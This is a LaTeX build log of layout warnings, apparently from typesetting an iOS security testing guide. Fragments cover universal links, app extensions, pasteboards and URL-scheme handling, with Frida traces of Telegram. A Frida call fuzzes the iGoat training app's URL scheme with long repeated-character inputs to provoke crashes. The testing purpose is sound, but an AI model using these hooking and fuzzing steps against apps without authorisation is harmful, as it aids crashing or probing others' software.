/n/10.95 value of \TU/SourceCodePro(6)/m/n/10.95 NSUserActivityTypeBrowsingWeb\
TU/SourceSansPro(0)/m/n/10.95 .
[700]
Underfull \hbox (badness 1097) in paragraph at lines 40278--40287
[]\TU/SourceSansPro(0)/m/n/10.95 As stated in the [][]Apple Developer Documenta
tion[][], when iOS opens an app as the result of a uni-

Underfull \hbox (badness 5217) in paragraph at lines 40278--40287
\TU/SourceSansPro(0)/m/n/10.95 versal link, the app receives an \TU/SourceCodeP
ro(6)/m/n/10.95 NSUserActivity \TU/SourceSansPro(0)/m/n/10.95 object with an \T
U/SourceCodePro(6)/m/n/10.95 activityType \TU/SourceSansPro(0)/m/n/10.95 value 
of

Underfull \hbox (badness 4739) in paragraph at lines 40278--40287
\TU/SourceCodePro(6)/m/n/10.95 NSUserActivityTypeBrowsingWeb\TU/SourceSansPro(0
)/m/n/10.95 . The activity object’s \TU/SourceCodePro(6)/m/n/10.95 webpageURL \
TU/SourceSansPro(0)/m/n/10.95 property contains

Overfull \hbox (75.83939pt too wide) in paragraph at lines 40298--40298
[]\TU/SourceCodePro(6)/m/n/10.95 func application(_ application: UIApplication,
 continue userActivity: NSUserActivity,[] 

Overfull \hbox (95.54948pt too wide) in paragraph at lines 40298--40298
[]                 \TU/SourceCodePro(6)/m/n/10.95 restorationHandler: @escaping
 ([UIUserActivityRestoring]?) -> Void) -> Bool {[] 

Overfull \hbox (174.38939pt too wide) in paragraph at lines 40298--40298
[]    \TU/SourceCodePro(6)/m/n/10.95 if userActivity.activityType == NSUserActi
vityTypeBrowsingWeb, let url = userActivity.webpageURL {[] 
[701]
Overfull \hbox (91.1694pt too wide) in paragraph at lines 40338--40338
[]        \TU/SourceCodePro(6)/m/n/10.95 let components = NSURLComponents(url: 
incomingURL, resolvingAgainstBaseURL: true),[] 

Overfull \hbox (14.51945pt too wide) in paragraph at lines 40338--40338
[]    \TU/SourceCodePro(6)/m/n/10.95 if let albumName = params.first(where: { $
0.name == "albumname" })?.value,[] 
[702]
Overfull \hbox (21.06395pt too wide) in paragraph at lines 40350--40353
[]\TU/SourceSansPro(0)/m/n/10.95 If you have the original source code, you can 
search it for the \TU/SourceCodePro(6)/m/n/10.95 openURL:options:completionHand
ler:

Overfull \hbox (113.06952pt too wide) in paragraph at lines 40376--40376
[]                        \TU/SourceCodePro(6)/m/n/10.95 options: [UIApplicatio
nOpenURLOptionUniversalLinksOnly: true as NSNumber],[] 

Overfull \hbox (14.51956pt too wide) in paragraph at lines 40376--40376
[]                        \TU/SourceCodePro(6)/m/n/10.95 completionHandler: { v
alue in completion.completion(value)}[] 

Underfull \hbox (badness 1565) in paragraph at lines 40378--40384
[]\TU/SourceSansPro(0)/m/n/10.95 Note how the app adapts the \TU/SourceCodePro(
6)/m/n/10.95 scheme \TU/SourceSansPro(0)/m/n/10.95 to “https” before opening it
 and how it uses the option
[703] [704]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e630660530187b6fd1e8abc487b7f7ea1ac607f9.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/78ccba3d3728d1b436149123dac95a31099b24de.
png" > [705]
Overfull \hbox (74.40862pt too wide) in paragraph at lines 40518--40522
[]\TU/SourceSansPro(0)/m/n/10.95 If we repeat the process and hook or trace the
 \TU/SourceCodePro(6)/m/n/10.95 application:continueUserActivity:restorationHan
dler:

Overfull \hbox (1.6642pt too wide) in paragraph at lines 40531--40535
\TU/SourceSansPro(0)/m/n/10.95 this example, we will use Telegram, as there are
 no restrictions in its \TU/SourceCodePro(6)/m/n/10.95 apple-app-site-associati
on
[706]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c541fc7b7d3f4dd9ff4b816d9bc3e5ce0484f553.
png" > [707]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 40597--40597
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 
[708]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 40632--40632
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 
[709]
Overfull \hbox (102.1193pt too wide) in paragraph at lines 40672--40672
[]\TU/SourceCodePro(6)/m/n/10.95 $S10TelegramUI0A19ApplicationBindingsC16openUn
iversalUrlyySS_AA0ac4OpenG10Completion...[] 

Overfull \hbox (148.10934pt too wide) in paragraph at lines 40672--40672
[]\TU/SourceCodePro(6)/m/n/10.95 $S10TelegramUI15openExternalUrl7account7contex
t3url05forceD016presentationData18application...[] 

Overfull \hbox (180.95932pt too wide) in paragraph at lines 40672--40672
[]\TU/SourceCodePro(6)/m/n/10.95 $S10TelegramUI31AuthorizationSequenceControlle
rC7account7strings7openUrl5apiId0J4HashAC0A4Core19...[] 

Overfull \hbox (51.74939pt too wide) in paragraph at lines 40686--40686
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 

Overfull \hbox (132.77936pt too wide) in paragraph at lines 40686--40686
[]\TU/SourceCodePro(6)/m/n/10.95 298619 ms     | $S10TelegramUI15openExternalUr
l7account7context3url05forceD016presentationData[] 

Overfull \hbox (99.92947pt too wide) in paragraph at lines 40686--40686
[]                \TU/SourceCodePro(6)/m/n/10.95 18applicationContext20navigati
onController12dismissInputy0A4Core7AccountC_AA[] 

Overfull \hbox (60.50946pt too wide) in paragraph at lines 40686--40686
[]                \TU/SourceCodePro(6)/m/n/10.95 14OpenURLContextOSSSbAA012Pres
entationK0CAA0a11ApplicationM0C7Display0[] 

Overfull \hbox (180.95932pt too wide) in paragraph at lines 40705--40705
[]\TU/SourceCodePro(6)/m/n/10.95 $ xcrun swift-demangle S10TelegramUI15openExte
rnalUrl7account7context3url05forceD016presentationData[] 

Overfull \hbox (187.52933pt too wide) in paragraph at lines 40705--40705
[]\TU/SourceCodePro(6)/m/n/10.95 18applicationContext20navigationController12di
smissInputy0A4Core7AccountC_AA14OpenURLContextOSSSbAA0[] 

Overfull \hbox (95.5494pt too wide) in paragraph at lines 40715--40715
[]    \TU/SourceCodePro(6)/m/n/10.95 account: TelegramCore.Account, context: Te
legramUI.OpenURLContext, url: Swift.String,[] 

Overfull \hbox (21.08942pt too wide) in paragraph at lines 40715--40715
[]    \TU/SourceCodePro(6)/m/n/10.95 forceExternal: Swift.Bool, presentationDat
a: TelegramUI.PresentationData,[] 

Overfull \hbox (71.45941pt too wide) in paragraph at lines 40715--40715
[]    \TU/SourceCodePro(6)/m/n/10.95 navigationController: Display.NavigationCo
ntroller?, dismissInput: () -> ()) -> ()[] 
[710]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 40769--40769
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 

Overfull \hbox (51.74939pt too wide) in paragraph at lines 40769--40769
[]\TU/SourceCodePro(6)/m/n/10.95 context: TelegramUI.OpenURLContext, url: Swift
.String, forceExternal: Swift.Bool,[] 

Overfull \hbox (124.01936pt too wide) in paragraph at lines 40769--40769
[]\TU/SourceCodePro(6)/m/n/10.95 TelegramUI.TelegramApplicationContext, navigat
ionController: Display.NavigationController?,[] 
[711]
Overfull \hbox (101.7325pt too wide) in paragraph at lines 40795--40802
\TU/SourceSansPro(0)/m/n/10.95 hook (e.g. by adding a line like this \TU/Source
CodePro(6)/m/n/10.95 log("userInfo:" + ObjC.Object(args[3]).userInfo().toString
());\TU/SourceSansPro(0)/m/n/10.95 ). 

Overfull \hbox (133.71016pt too wide) in paragraph at lines 40812--40815
[]\TU/SourceSansPro(0)/m/n/10.95 Both rely on the same method when receiving da
ta (\TU/SourceCodePro(6)/m/n/10.95 application:continueUserActivity:restoration
Handler:\TU/SourceSansPro(0)/m/n/10.95 ). 

Overfull \hbox (161.5597pt too wide) in paragraph at lines 40815--40821
[]\TU/SourceSansPro(0)/m/n/10.95 Like universal links, the Handoff’s Activity C
ontinuation must be declared in the \TU/SourceCodePro(6)/m/n/10.95 com.apple.de
veloper.associated-domains
[712]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 40852--40852
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8f48bb85a349f9e3264a10f6d5ab82d6404eb8b7.
png" > [713] [714]
Overfull \hbox (106.17824pt too wide) in paragraph at lines 40979--40985
[]\TU/SourceSansPro(0)/m/n/10.95 if the app properly \TU/SourceSansPro(0)/m/it/
10.95 verifies the received data \TU/SourceSansPro(0)/m/n/10.95 by looking into
 the implementation of [][]\TU/SourceCodePro(6)/m/n/10.95 application:openURL:o
ptions:[][]
[715]
Overfull \hbox (4.9054pt too wide) in paragraph at lines 41055--41057
[]\TU/SourceSansPro(0)/m/n/10.95 The app also declares the document types it op
ens as we can find the key \TU/SourceCodePro(6)/m/n/10.95 CFBundleDocumentTypes
\TU/SourceSansPro(0)/m/n/10.95 : 
[716]
Overfull \hbox (221.32112pt too wide) in paragraph at lines 41078--41085
\TU/SourceCodePro(6)/m/n/10.95 LSItemContentTypes \TU/SourceSansPro(0)/m/n/10.9
5 and it’s ready to open files with the extensions listed in \TU/SourceCodePro(
6)/m/n/10.95 UTTypeTagSpecification/"public.filename-extension"\TU/SourceSansPr
o(0)/m/n/10.95 .

Underfull \hbox (badness 3229) in paragraph at lines 41104--41106
[]\TU/SourceSansPro(0)/m/n/10.95 The \TU/SourceCodePro(6)/m/n/10.95 excludedAct
ivityTypes\TU/SourceSansPro(0)/m/n/10.95 : an array of the Activity Types that 
are not supported,

Overfull \hbox (71.8354pt too wide) in paragraph at lines 41113--41117
[]\TU/SourceSansPro(0)/m/n/10.95 Hook the method we have seen in the static ana
lysis ([][]\TU/SourceCodePro(6)/m/n/10.95 init(activityItems:applicationActivit
ies:)[][]\TU/SourceSansPro(0)/m/n/10.95 )
[717] [718] [719] [720]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/bd8dc141de1388af244f55cf297a00d01629c14f.
png" >
Overfull \hbox (65.98448pt too wide) in paragraph at lines 41334--41334
 []                    \TU/SourceCodePro(6)/m/n/10.95 /Containers/com.some.file
manager/Documents/Inbox/OWASP_MASVS.pdf[] 

Overfull \hbox (37.5144pt too wide) in paragraph at lines 41334--41334
 []    \TU/SourceCodePro(6)/m/n/10.95 UIApplicationOpenURLOptionsSourceApplicat
ionKey = "com.apple.sharingd";[] 

Overfull \hbox (140.44437pt too wide) in paragraph at lines 41334--41334
 []    \TU/SourceCodePro(6)/m/n/10.95 "_UIApplicationOpenURLOptionsSourceProces
sHandleKey" = "<FBSProcessHandle: 0x1c3a63140;[] 

Overfull \hbox (11.23476pt too wide) in paragraph at lines 41334--41334
 []                                                                \TU/SourceCo
dePro(6)/m/n/10.95 sharingd:605; valid: YES>";[] 

Overfull \hbox (164.53435pt too wide) in paragraph at lines 41334--41334
 []\TU/SourceCodePro(6)/m/n/10.95 0x18c7930d8 UIKit!__58-[UIApplication _applic
ationOpenURLAction:payload:origin:]_block_invoke[] 
[721]
Overfull \hbox (65.98438pt too wide) in paragraph at lines 41334--41334
 []\TU/SourceCodePro(6)/m/n/10.95 0x1857cdc34 FrontBoardServices!-[FBSSerialQue
ue _performNextFromRunLoopSource][] 

Overfull \hbox (1.37955pt too wide) in paragraph at lines 41357--41357
[]                            \TU/SourceCodePro(6)/m/n/10.95 /com.some.filemana
ger/Documents/Inbox/OWASP_MASVS.pdf[] 

Overfull \hbox (137.15936pt too wide) in paragraph at lines 41357--41357
[]\TU/SourceCodePro(6)/m/n/10.95 0x18c7930d8 UIKit!__58-[UIApplication _applica
tionOpenURLAction:payload:origin:]_block_invoke[] 

Overfull \hbox (21.08937pt too wide) in paragraph at lines 41357--41357
[]\TU/SourceCodePro(6)/m/n/10.95 0x1857cd9f4 FrontBoardServices!__FBSSERIALQUEU
E_IS_CALLING_OUT_TO_A_BLOCK__[] 

Underfull \hbox (badness 3128) in paragraph at lines 41359--41370
[]\TU/SourceSansPro(0)/m/n/10.95 If you look at the stack trace, you can see ho
w \TU/SourceCodePro(6)/m/n/10.95 application:openURL:options: \TU/SourceSansPro
(0)/m/n/10.95 called
[722]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5473929e7bf77cdcc33fa8e73d8852d5453b9fa9.
png" > [723]
Overfull \hbox (21.48004pt too wide) in paragraph at lines 41503--41506
[]\TU/SourceSansPro(0)/m/n/10.95 If you have the original source code you can s
earch for all occurrences of \TU/SourceCodePro(6)/m/n/10.95 NSExtensionPointIde
ntifier

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/557a97dedf920b66a40f2e92cd9f0010948caa4d.
png" > [724]
Overfull \hbox (21.0894pt too wide) in paragraph at lines 41548--41548
[]    \TU/SourceCodePro(6)/m/n/10.95 /var/containers/Bundle/Application/15E6A58
F-1CA7-44A4-A9E0-6CA85B65FA35/[] 

Overfull \hbox (71.45897pt too wide) in paragraph at lines 41548--41548
[]\TU/SourceCodePro(6)/m/n/10.95 ------------  -------  ------------------  ---
---  -------   -------------------------[] 

Overfull \hbox (16.70961pt too wide) in paragraph at lines 41548--41548
[]\TU/SourceCodePro(6)/m/n/10.95 Directory         493  None                Tru
e    False     NotificationContent.appex[] 
[725]
Underfull \hbox (badness 4995) in paragraph at lines 41593--41602
[]\TU/SourceSansPro(0)/m/n/10.95 Remember that app extensions and their contain
ing apps do not have direct access to each

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/58e3d56af1f679e03a8f5cb31471a7c09d6e23c2.
png" >
Overfull \hbox (174.45512pt too wide) in paragraph at lines 41616--41622
[]\TU/SourceSansPro(0)/m/n/10.95 It is possible to reject a specific type of ap
p extension by using the method [][]\TU/SourceCodePro(6)/m/n/10.95 application:
shouldAllowExtensionPointIdentifier:[][]\TU/SourceSansPro(0)/m/n/10.95 .
[726]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/73067a4b013a3b6059ad9d5d1dcc72d0079ba9b8.
png" > [727]
Overfull \hbox (45.17938pt too wide) in paragraph at lines 41672--41672
[]\TU/SourceCodePro(6)/m/n/10.95 0x18284355c Foundation!-[NSExtension _itemProv
iderForPayload:extensionContext:][] 

Overfull \hbox (143.72934pt too wide) in paragraph at lines 41672--41672
[]\TU/SourceCodePro(6)/m/n/10.95 0x1828447a4 Foundation!-[NSExtension _loadItem
ForPayload:contextIdentifier:completionHandler:][] 

Overfull \hbox (47.36937pt too wide) in paragraph at lines 41672--41672
[]\TU/SourceCodePro(6)/m/n/10.95 0x182973224 Foundation!__NSXPCCONNECTION_IS_CA
LLING_OUT_TO_EXPORTED_OBJECT_S3__[] 

Overfull \hbox (58.31937pt too wide) in paragraph at lines 41672--41672
[]\TU/SourceCodePro(6)/m/n/10.95 0x182971968 Foundation!-[NSXPCConnection _deco
deAndInvokeMessageWithEvent:flags:][] 

Overfull \hbox (145.91937pt too wide) in paragraph at lines 41672--41672
[]    \TU/SourceCodePro(6)/m/n/10.95 "<NSItemProvider: 0x1c46b30e0> {types = (\
n \"public.plain-text\",\n \"public.file-url\"\n)}"[] 

Overfull \hbox (8.29985pt too wide) in paragraph at lines 41683--41688
[]\TU/SourceSansPro(0)/m/n/10.95 The UTIs included in the \TU/SourceCodePro(6)/
m/n/10.95 NSItemProvider \TU/SourceSansPro(0)/m/n/10.95 are \TU/SourceCodePro(6
)/m/n/10.95 public.plain-text \TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCode
Pro(6)/m/n/10.95 public.file-url\TU/SourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (152.48935pt too wide) in paragraph at lines 41707--41707
[]\TU/SourceCodePro(6)/m/n/10.95 RET: <PKPlugin: 0x1163637f0 ph.telegra.Telegra
ph.Share(5.3) 5B6DE177-F09B-47DA-90CD-34D73121C785[] 

Overfull \hbox (80.21938pt too wide) in paragraph at lines 41707--41707
[]\TU/SourceCodePro(6)/m/n/10.95 1(2) /private/var/containers/Bundle/Applicatio
n/15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35[] 

Overfull \hbox (165.62935pt too wide) in paragraph at lines 41707--41707
[]\TU/SourceCodePro(6)/m/n/10.95 RET: <PKPlugin: 0x10bff7910 com.apple.mobileno
tes.SharingExtension(1.5) 73E4F137-5184-4459-A70A-83[] 

Overfull \hbox (150.29936pt too wide) in paragraph at lines 41707--41707
[]\TU/SourceCodePro(6)/m/n/10.95 F90A1414DC 1(2) /private/var/containers/Bundle
/Application/5E267B56-F104-41D0-835B-F1DAB9AE076D[] 
[728]
Underfull \hbox (badness 10000) in paragraph at lines 41717--41719
[]\TU/SourceCodePro(6)/m/n/10.95 com.apple.mobilenotes.SharingExtension.appex \
TU/SourceSansPro(0)/m/n/10.95 which is receiving and will
[729]
Overfull \hbox (61.00945pt too wide) in paragraph at lines 41788--41794
[]\TU/SourceSansPro(0)/bx/n/10.95 Custom pasteboards \TU/SourceSansPro(0)/m/n/1
0.95 can be created with [][]\TU/SourceCodePro(6)/m/n/10.95 pasteboardWithName:
create:[][] \TU/SourceSansPro(0)/m/n/10.95 or [][]\TU/SourceCodePro(6)/m/n/10.9
5 pasteboardWithUniqueName[][]\TU/SourceSansPro(0)/m/n/10.95 .
[730] [731] [732] [733]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/95cff8add424bdeb2b14d8bcd415271271611314.
png" > [734]
Overfull \hbox (104.919pt too wide) in paragraph at lines 42137--42142
\TU/SourceSansPro(0)/m/n/10.95 rameters by creating appropriately formatted URL
s and opening them with the [][]\TU/SourceCodePro(6)/m/n/10.95 openURL:options:
completionHandler:[][]

Overfull \hbox (7.82901pt too wide) in paragraph at lines 42160--42169
[]\TU/SourceSansPro(0)/m/n/10.95 Before calling the \TU/SourceCodePro(6)/m/n/10
.95 openURL:options:completionHandler: \TU/SourceSansPro(0)/m/n/10.95 method, a
pps can call [][]\TU/SourceCodePro(6)/m/n/10.95 canOpenURL:[][]
[735]
Overfull \hbox (55.19263pt too wide) in paragraph at lines 42180--42187
\TU/SourceSansPro(0)/m/n/10.95 stalled. However, this restriction only applies 
to \TU/SourceCodePro(6)/m/n/10.95 canOpenURL\TU/SourceSansPro(0)/m/n/10.95 , \T
U/SourceSansPro(0)/bx/n/10.95 the \TU/SourceCodePro(6)/bx/n/10.95 openURL:optio
ns:completionHandler:

Overfull \hbox (175.60478pt too wide) in paragraph at lines 42221--42225
[]\TU/SourceCodePro(6)/m/n/10.95 application:didFinishLaunchingWithOptions: \TU
/SourceSansPro(0)/m/n/10.95 method or \TU/SourceCodePro(6)/m/n/10.95 applicatio
n:will-FinishLaunchingWithOptions:\TU/SourceSansPro(0)/m/n/10.95 :

Overfull \hbox (156.8694pt too wide) in paragraph at lines 42261--42261
[]\TU/SourceCodePro(6)/m/n/10.95 func application(_ application: UIApplication,
 open url: URL, sourceApplication: String?) -> Bool {[] 
[736]
Overfull \hbox (97.73941pt too wide) in paragraph at lines 42261--42261
[]\TU/SourceCodePro(6)/m/n/10.95 func application(_ application: UIApplication,
 open url: URL, sourceApplication: String?,[] 

Overfull \hbox (16.70943pt too wide) in paragraph at lines 42261--42261
[]\TU/SourceCodePro(6)/m/n/10.95 func application(_ application: UIApplication,
 handleOpen url: URL) -> Bool {[] 
[737]
Overfull \hbox (25.46942pt too wide) in paragraph at lines 42326--42326
[]    \TU/SourceCodePro(6)/m/n/10.95 options: [UIApplicationOpenURLOptionUniver
salLinksOnly: true as NSNumber],[] 

Overfull \hbox (25.46942pt too wide) in paragraph at lines 42326--42326
[]    \TU/SourceCodePro(6)/m/n/10.95 options: [UIApplicationOpenURLOptionUniver
salLinksOnly: true as NSNumber],[] 

Overfull \hbox (84.59961pt too wide) in paragraph at lines 42343--42343
[]                                        \TU/SourceCodePro(6)/m/n/10.95 string
: "https://telegram.org/deactivate?phone=\(phone)")![] 

Overfull \hbox (40.79941pt too wide) in paragraph at lines 42360--42360
[]\TU/SourceCodePro(6)/m/n/10.95 if documentUri.hasPrefix("file://"), let path 
= URL(string: documentUri)?.path {[] 
[738]
Overfull \hbox (170.00934pt too wide) in paragraph at lines 42360--42360
[]\TU/SourceCodePro(6)/m/n/10.95 guard let dict = TGStringUtils.argumentDiction
ary(inUrlString: String(url[url.index(url.startIndex,[] 

Overfull \hbox (29.84938pt too wide) in paragraph at lines 42360--42360
[]\TU/SourceCodePro(6)/m/n/10.95 if let url = URL(string: "itms-apps://itunes.a
pple.com/app/id\(appStoreId)") {[] 

Overfull \hbox (16.7094pt too wide) in paragraph at lines 42360--42360
[]\TU/SourceCodePro(6)/m/n/10.95 [[WKExtension sharedExtension] openSystemURL:[
NSURL URLWithString:[NSString[] 
[739] [740]
Overfull \hbox (3.5245pt too wide) in paragraph at lines 42501--42501
[]\TU/SourceCodePro(6)/m/n/10 ObjC[].[]classes[].[]UIApplication[].[]sharedAppl
ication[]()[];[]|  

Overfull \hbox (249.8999pt too wide) in paragraph at lines 42510--42515
[]\TU/SourceSansPro(0)/m/n/10.95 Or as in this example from [][]Frida CodeShare
[][] where the author uses the non-public API \TU/SourceCodePro(6)/m/n/10.95 LS
ApplicationWorkspace.openSensitiveURL:withOptions:
[741]
Overfull \hbox (62.69954pt too wide) in paragraph at lines 42570--42570
[]  \TU/SourceCodePro(6)/m/n/10.95 URI                  yes       URI to launch
, eg tel://123456789 or http://www.google.com/[] 
[742] [743]
Overfull \hbox (208.13008pt too wide) in paragraph at lines 42668--42671
[]\TU/SourceSansPro(0)/m/n/10.95 We can also know from where it was called, as 
expected from \TU/SourceCodePro(6)/m/n/10.95 -[UIApplication _applicationOpenUR
LAction:payload:origin:]\TU/SourceSansPro(0)/m/n/10.95 . 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c441621c9bee29c2fbc9a04d05bc8426d67bfff9.
jpg" > [744]
Overfull \hbox (3.5245pt too wide) in paragraph at lines 42699--42699
[]\TU/SourceCodePro(6)/m/n/10 ObjC[].[]classes[].[]UIApplication[].[]sharedAppl
ication[]()[];[]|  
[745]
Overfull \hbox (141.464pt too wide) in paragraph at lines 42739--42746
[]\TU/SourceSansPro(0)/m/n/10.95 The output is truncated for better readability
. This time you see that \TU/SourceCodePro(6)/m/n/10.95 UIApplicationOpenURLOpt
ionsSourceApplicationKey
[746]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a9306a55201426996cd4188ec50973be63efb594.
png" >
Overfull \hbox (21.5245pt too wide) in paragraph at lines 42770--42770
[]\TU/SourceCodePro(6)/m/n/10 $S10TelegramUI15openExternalUrl7account7context3u
rl05forceD016presentationData[]|  

Overfull \hbox (21.5245pt too wide) in paragraph at lines 42771--42771
\TU/SourceCodePro(6)/m/n/10 text20navigationController12dismissInputy0A4Core7Ac
countC_AA14Open|  

Overfull \hbox (69.5245pt too wide) in paragraph at lines 42772--42772
\TU/SourceCodePro(6)/m/n/10 bAA012PresentationK0CAA0a11ApplicationM0C7Display01
0NavigationO0CSgyyctF()[]|  
[747] [748]
Underfull \hbox (badness 7796) in paragraph at lines 42852--42855
[]\TU/SourceCodePro(6)/m/n/10.95 application:openURL:options: \TU/SourceSansPro
(0)/m/n/10.95 handles the URL but does not open it, it calls

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/eecc821a0dd66cce69d08c4b2975ef636b355063.
png" > [749] [750] [751]
Overfull \hbox (87.28583pt too wide) in paragraph at lines 42989--42991
[]\TU/SourceSansPro(0)/m/n/10.95 Check if the app generates a crash report (\TU
/SourceCodePro(6)/m/n/10.95 .ips\TU/SourceSansPro(0)/m/n/10.95 ) in \TU/SourceC
odePro(6)/m/n/10.95 /private/var/mobile/Library/Logs/CrashReporter\TU/SourceSan
sPro(0)/m/n/10.95 . 

Overfull \hbox (98.8994pt too wide) in paragraph at lines 43003--43007
\TU/SourceSansPro(0)/m/n/10.95 iGoat-Swift app supports the following URL schem
e and parameters: \TU/SourceCodePro(6)/m/n/10.95 iGoat://?contactNumber={0}&mes
sage={0}\TU/SourceSansPro(0)/m/n/10.95 . 

Overfull \hbox (45.17938pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 [iPhone::SpringBoard]-> fuzz("iGoat", "iGoat:/
/?contactNumber={0}&message={0}")[] 
[752]
Overfull \hbox (156.86938pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 Opened URL: iGoat://?contactNumber=AAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (156.86938pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 Opened URL: iGoat://?contactNumber=AAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 &message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 
[753]
Overfull \hbox (127.88235pt too wide) in paragraph at lines 43060--43065
\TU/SourceSansPro(0)/m/n/10.95 could be the case. We would be able to inspect t
he crash reports in \TU/SourceCodePro(6)/m/n/10.95 /private/var/mobile/Library/
Logs/CrashReporter
[754]
Underfull \hbox (badness 6978) in paragraph at lines 43121--43125
[]\TU/SourceSansPro(0)/m/n/10.95 JavaScript is enabled by default but thanks to
 the \TU/SourceCodePro(6)/m/n/10.95 javaScriptEnabled \TU/SourceSansPro(0)/m/n/
10.95 property of

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/aa3dda3347111e374cb9b24068c0d2054439c109.
png" > [755] [756]
